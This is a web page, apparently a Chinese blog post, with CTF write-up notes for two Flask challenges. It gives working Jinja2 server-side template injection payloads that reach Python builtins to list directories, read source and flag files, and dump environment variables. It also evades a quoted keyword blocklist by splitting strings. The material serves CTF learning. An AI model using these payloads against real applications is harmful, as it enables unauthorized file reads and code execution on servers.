@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>做题笔记 - EZzz</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="111111111111[GYCTF2020]FlaskApp
+1.在解码中发现开的debug
+12345678910@app.route(&amp;#x27;/decode&amp;#x27;,methods=[,"> 
+    
+    <link rel="alternative" href="atom.xml" title="EZzz" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="做题笔记 - EZzz"/>
+    <meta name="twitter:description" content="111111111111[GYCTF2020]FlaskApp
+1.在解码中发现开的debug
+12345678910@app.route(&amp;#x27;/decode&amp;#x27;,methods=[,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="EZzz"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="做题笔记 - EZzz"/>
+    <meta property="og:description" content="111111111111[GYCTF2020]FlaskApp
+1.在解码中发现开的debug
+12345678910@app.route(&amp;#x27;/decode&amp;#x27;,methods=[,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">EZzz</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">做题笔记</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">做题笔记</h1>
+        <div class="stuff">
+            <span>一月 04, 2023</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>111111111111[GYCTF2020]FlaskApp</p>
+<p>1.在解码中发现开的debug</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>
+
+<p>源代码名称为app.py</p>
+<p>2.读源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>): </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    <span class="comment">#34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span></span><br><span class="line">]</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower(): </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>@ app.route( &amp;<span class="comment">#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用catch_warnings的os方法获取文件名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现在this_is_the_flag.txt文件里</p>
+<p>读取this_is_the_flag.txt即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>222222222222222[Flask]SSTI</p>
+<p>get[name]传参，存在ssti，{2*2}可以运行，是jinja模板</p>
+<p>直接使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).open(&#x27;env&#x27;).read()&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打印环境变量直接出</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
